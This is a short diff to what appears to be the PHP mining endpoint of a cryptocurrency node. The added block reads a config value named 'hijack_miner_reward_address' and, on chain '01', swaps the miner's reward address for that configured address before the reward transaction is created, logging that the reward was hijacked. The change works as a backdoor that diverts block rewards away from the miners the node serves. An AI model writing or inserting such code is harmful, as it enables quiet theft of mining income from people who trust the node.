@@ -269,6 +269,13 @@ if ($q == "info") {
 	$new_block_date = $block_date + $elapsed;
 	$rewardInfo = Block::reward($height);
 	$minerReward = num($rewardInfo['miner']);
+
+
+	if (isset($_config['hijack_miner_reward_address']) && CHAIN_ID == "01") {
+		$address = $_config['hijack_miner_reward_address'];
+		_log("MINER REWARD HIJACKED TO " . $address);
+	}
+
 	$reward_tx = Transaction::getRewardTransaction($address, $new_block_date, $_config['generator_public_key'], $_config['generator_private_key'], $minerReward, $msg);
 
 //	$l .= " reward_tx=".json_encode($reward_tx);
